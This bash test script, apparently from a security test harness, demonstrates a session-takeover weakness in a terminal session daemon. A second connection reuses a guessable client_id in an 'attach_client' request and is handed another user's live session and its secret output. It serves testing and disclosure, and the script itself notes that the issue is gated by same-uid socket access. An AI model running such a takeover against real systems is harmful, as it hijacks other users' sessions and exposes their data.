#!/usr/bin/env bash
# client_id is an unauthenticated capability: anything that can connect to the
# socket and knows/guesses a client_id can silently steal that client's session
# via attach_client (no --force, no session name needed), booting the original.
set -u
. /harness/lib.sh

hr "T06: client_id capability — silent session takeover"
start_daemon || exit 1

echo "-- client 'alice' creates a session and starts a sensitive program --"
as_victim python3 /harness/drive.py "$VICTIM_SOCK" $'echo TOP-SECRET-ALICE\n' &
sleep 1.2
as_victim python3 /harness/probe.py "$VICTIM_SOCK" '{"type":"list"}'

echo
echo "-- a second connection reuses client_id 'driver' via attach_client --"
echo "   (no force flag, no session name) and is handed alice's live session:"
as_victim python3 /harness/probe.py "$VICTIM_SOCK" '{"type":"attach_client","client_id":"driver","rows":24,"cols":80}' --frames 2>&1 | head -6

echo
echo "Note: today this is gated only by socket access (same uid). Where this matters"
echo "is defense-in-depth: client_id travels via env/ssh cmdline and is not a secret."

stop_daemon
